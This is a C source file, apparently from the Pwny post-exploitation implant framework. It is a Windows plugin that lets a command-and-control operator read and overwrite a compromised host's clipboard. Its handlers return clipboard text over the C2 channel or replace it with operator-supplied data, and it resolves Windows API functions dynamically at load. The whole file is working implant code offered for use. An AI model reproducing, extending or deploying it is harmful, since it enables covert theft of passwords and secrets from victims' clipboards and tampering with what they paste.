/*
 * MIT License
 *
 * Copyright (c) 2020-2026 EntySec
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

/*
 * Clipboard COT plugin — get/set Windows clipboard text.
 */

#ifdef __windows__

#include <pwny/api.h>
#include <pwny/tlv_types.h>
#include <pwny/c2.h>

#include <windows.h>

#define COT_PLUGIN
#include <pwny/tab_cot.h>

/* ------------------------------------------------------------------ */
/* Constants                                                           */
/* ------------------------------------------------------------------ */


#define CLIPBOARD_GET \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       TAB_BASE, \
                       API_CALL)
#define CLIPBOARD_SET \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       TAB_BASE, \
                       API_CALL + 1)

#define TLV_TYPE_CLIP_DATA \
        TLV_TYPE_CUSTOM(TLV_TYPE_STRING, TAB_BASE, API_TYPE)

/* ------------------------------------------------------------------ */
/* Win32 typedefs                                                      */
/* ------------------------------------------------------------------ */

typedef BOOL    (WINAPI *fn_OpenClipboard)(HWND);
typedef BOOL    (WINAPI *fn_CloseClipboard)(void);
typedef BOOL    (WINAPI *fn_EmptyClipboard)(void);
typedef HANDLE  (WINAPI *fn_GetClipboardData)(UINT);
typedef HANDLE  (WINAPI *fn_SetClipboardData)(UINT, HANDLE);
typedef HGLOBAL (WINAPI *fn_GlobalAlloc)(UINT, SIZE_T);
typedef HGLOBAL (WINAPI *fn_GlobalFree)(HGLOBAL);
typedef LPVOID  (WINAPI *fn_GlobalLock)(HGLOBAL);
typedef BOOL    (WINAPI *fn_GlobalUnlock)(HGLOBAL);
typedef void    (WINAPI *fn_Sleep)(DWORD);

static struct
{
    fn_OpenClipboard    pOpenClipboard;
    fn_CloseClipboard   pCloseClipboard;
    fn_EmptyClipboard   pEmptyClipboard;
    fn_GetClipboardData pGetClipboardData;
    fn_SetClipboardData pSetClipboardData;
    fn_GlobalAlloc      pGlobalAlloc;
    fn_GlobalFree       pGlobalFree;
    fn_GlobalLock       pGlobalLock;
    fn_GlobalUnlock     pGlobalUnlock;
    fn_Sleep            pSleep;
} w;

/* ------------------------------------------------------------------ */
/* Inline helpers                                                      */
/* ------------------------------------------------------------------ */

/* Try to open the clipboard with retries.
 * OpenClipboard(NULL) can fail transiently when another process
 * holds the clipboard lock. */
static __inline BOOL clipboard_open(int retries)
{
    int i;

    for (i = 0; i < retries; i++)
    {
        if (w.pOpenClipboard(NULL))
            return TRUE;

        w.pSleep(50);
    }

    return FALSE;
}

/* ------------------------------------------------------------------ */
/* Handlers                                                            */
/* ------------------------------------------------------------------ */

static tlv_pkt_t *clipboard_get(c2_t *c2)
{
    tlv_pkt_t *result;
    HANDLE hData;
    char *text;

    if (!clipboard_open(10))
    {
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    hData = w.pGetClipboardData(CF_TEXT);
    if (hData == NULL)
    {
        w.pCloseClipboard();
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    text = (char *)w.pGlobalLock(hData);
    if (text == NULL)
    {
        w.pCloseClipboard();
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    result = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
    tlv_pkt_add_string(result, TLV_TYPE_CLIP_DATA, text);

    w.pGlobalUnlock(hData);
    w.pCloseClipboard();

    return result;
}

static tlv_pkt_t *clipboard_set(c2_t *c2)
{
    /* Heap-allocate the receive buffer to avoid a 64 KB stack frame.
     * In a COT plugin the MinGW cross-compiler may not emit __chkstk,
     * so a large stack allocation can jump past the guard page and
     * cause an access-violation. */
    char *data;
    HGLOBAL hMem;
    char *pMem;
    size_t len;

    data = (char *)malloc(65536);
    if (data == NULL)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    if (tlv_pkt_get_string(c2->request, TLV_TYPE_CLIP_DATA, data) <= 0)
    {
        free(data);
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    if (!clipboard_open(10))
    {
        free(data);
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    w.pEmptyClipboard();

    len = strlen(data) + 1;
    hMem = w.pGlobalAlloc(0x0002 /* GMEM_MOVEABLE */, len);
    if (hMem == NULL)
    {
        w.pCloseClipboard();
        free(data);
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    pMem = (char *)w.pGlobalLock(hMem);
    if (pMem == NULL)
    {
        w.pGlobalFree(hMem);
        w.pCloseClipboard();
        free(data);
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    memcpy(pMem, data, len);
    w.pGlobalUnlock(hMem);
    free(data);

    if (w.pSetClipboardData(CF_TEXT, hMem) == NULL)
    {
        /* SetClipboardData failed — we still own the handle */
        w.pGlobalFree(hMem);
        w.pCloseClipboard();
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    w.pCloseClipboard();

    return api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
}

/* ------------------------------------------------------------------ */
/* COT entry                                                           */
/* ------------------------------------------------------------------ */

COT_ENTRY
{
    w.pOpenClipboard    = (fn_OpenClipboard)cot_resolve("user32.dll", "OpenClipboard");
    w.pCloseClipboard   = (fn_CloseClipboard)cot_resolve("user32.dll", "CloseClipboard");
    w.pEmptyClipboard   = (fn_EmptyClipboard)cot_resolve("user32.dll", "EmptyClipboard");
    w.pGetClipboardData = (fn_GetClipboardData)cot_resolve("user32.dll", "GetClipboardData");
    w.pSetClipboardData = (fn_SetClipboardData)cot_resolve("user32.dll", "SetClipboardData");
    w.pGlobalAlloc      = (fn_GlobalAlloc)cot_resolve("kernel32.dll", "GlobalAlloc");
    w.pGlobalLock       = (fn_GlobalLock)cot_resolve("kernel32.dll", "GlobalLock");
    w.pGlobalUnlock     = (fn_GlobalUnlock)cot_resolve("kernel32.dll", "GlobalUnlock");
    w.pGlobalFree       = (fn_GlobalFree)cot_resolve("kernel32.dll", "GlobalFree");
    w.pSleep            = (fn_Sleep)cot_resolve("kernel32.dll", "Sleep");

    api_call_register(api_calls, CLIPBOARD_GET, (api_t)clipboard_get);
    api_call_register(api_calls, CLIPBOARD_SET, (api_t)clipboard_set);
}

#else /* POSIX */

#include <pwny/api.h>
#include <pwny/tab.h>

void register_tab_api_calls(api_calls_t **api_calls)
{
    (void)api_calls;
}

#endif
